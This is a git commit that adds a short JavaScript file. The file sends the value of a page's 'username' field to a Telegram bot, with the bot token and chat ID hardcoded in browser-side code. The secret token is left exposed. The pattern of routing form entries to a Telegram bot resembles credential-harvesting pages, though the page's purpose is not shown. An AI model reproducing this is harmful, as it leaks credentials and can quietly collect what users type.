2269abef273ec542be56d21f6b3d79834694b668
Islombek Baxromov <a@a.com>
2023-10-31 19:23:40 +0500

    add files

---
+++ script.js
@@ -0,0 +1,21 @@
+// sendtelegram
+function sendtelegram(message) {
+  let telegram_bot_id = "6486417954:AAHijIqaZGoScVrlOFLEmSO5zkFCppPFuB0";
+  let chat_id = 700727696;
+  let settings = {
+    async: true,
+    crossDomain: true,
+    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "cache-control": "no-cache",
+    },
+    data: JSON.stringify({ chat_id: chat_id, text: message }),
+  };
+  $.ajax(settings).done(function (response) {});
+}
+
+function send() {
+  sendtelegram(document.getElementById("username").value);
+}
